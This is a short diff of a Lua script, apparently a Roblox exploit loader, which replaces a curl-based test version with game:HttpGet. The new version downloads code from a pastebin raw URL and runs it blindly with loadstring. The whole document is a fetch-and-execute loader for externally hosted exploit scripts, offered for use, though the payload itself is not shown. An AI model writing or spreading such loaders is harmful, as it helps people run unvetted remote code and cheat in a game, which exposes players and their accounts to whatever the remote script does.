@@ -1,13 +1,12 @@
--- This acts exactly like a Roblox exploit loader
+-- The Final Roblox Loader Script
 local pastebinURL = "https://pastebin.com/raw/7afQYE9L"
 
--- We simulate HttpGet using a quick terminal trick for testing
-local handle = io.popen("curl -s " .. pastebinURL)
-local scriptContent = handle:read("*a")
-handle:close()
+local success, scriptContent = pcall(function()
+    return game:HttpGet(pastebinURL)
+end)
 
-if scriptContent and scriptContent ~= "" then
-    assert(load(scriptContent))()
+if success and scriptContent and scriptContent ~= "" then
+    loadstring(scriptContent)()
 else
-    print("Failed to download script from Pastebin.")
+    warn("Failed to securely stream source code from Pastebin.")
 end
